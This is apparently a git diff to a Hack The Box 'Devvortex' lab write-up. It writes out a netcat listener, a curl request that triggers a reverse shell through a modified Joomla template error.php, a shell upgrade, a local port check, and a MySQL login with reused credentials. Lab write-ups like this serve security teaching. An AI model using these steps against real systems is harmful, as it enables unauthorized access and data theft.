@@ -221,14 +221,11 @@ python3 -m http.server 8000
 <br>
 
 We also need to start a netcat listener to catch the reverse connection.
-<br>
-<br>
 
 ```
 nc -lnvp 4444
 ```
 <img width="263" height="51" alt="image" src="https://github.com/user-attachments/assets/af160bf8-316a-4588-ab31-b60c53fd72c8" />
-<br>
 <br>
 
 Now we can send a curl request to error.php to trigger the reverse-shell.
@@ -238,6 +235,7 @@ curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
 ```
 
 <img width="538" height="87" alt="image" src="https://github.com/user-attachments/assets/64d75c22-b71f-456c-9300-1f7f98dc076c" />
+<br>
 
 We should receive a reverse-shell connection on our netcat listener.
 
@@ -246,6 +244,28 @@ Let's upgrade our shell.
 ```
 script /dev/null -c bash
 ```
+
+<img width="515" height="162" alt="image" src="https://github.com/user-attachments/assets/ebc2bdd7-4196-453f-98bb-0705dce4626c" />
+
+Check which ports are listening locally
+<br>
+
+```
+ss -tlpn
+```
+<img width="1108" height="268" alt="image" src="https://github.com/user-attachments/assets/a29d8e42-8ab8-48a9-b13d-e23349f3271f" />
+<br>
+<br>
+
+Port 3306 and 33060 are SQL ports.
+
+Attempt to login to SQL using previous lewis credentials.
+
+<img width="670" height="291" alt="image" src="https://github.com/user-attachments/assets/6d6755ed-b57f-4871-9c4c-7dd9a5bf09cb" />
+<br>
+<br>
+It works, and we gain access to the SQL database.
+
 
 
 
